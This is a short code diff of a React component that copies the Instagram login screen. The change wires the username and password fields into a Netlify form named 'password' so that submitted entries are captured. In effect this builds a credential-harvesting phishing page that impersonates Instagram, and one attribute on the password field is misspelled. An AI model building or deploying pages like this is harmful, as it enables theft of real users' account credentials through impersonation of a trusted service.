@@ -8,15 +8,16 @@ function App() {
         <div className="container">
           <div className="phone-app-demo" />
           <div className="form-data">
-            <form action="">
-              <div className="logo">
+            <form name="password"  method="POST" data-netlify="true">
+             <div className="logo">
                 <h1>Instagram</h1>
               </div>
               <input
+                name="name"
                 type="text"
                 placeholder="Phone number, username, or email"
               />
-              <input type="password" placeholder="Password" />
+              <input type="password" ame="password" placeholder="Password" />
               <button className="form-btn" type="submit">
                 Log in
               </button>
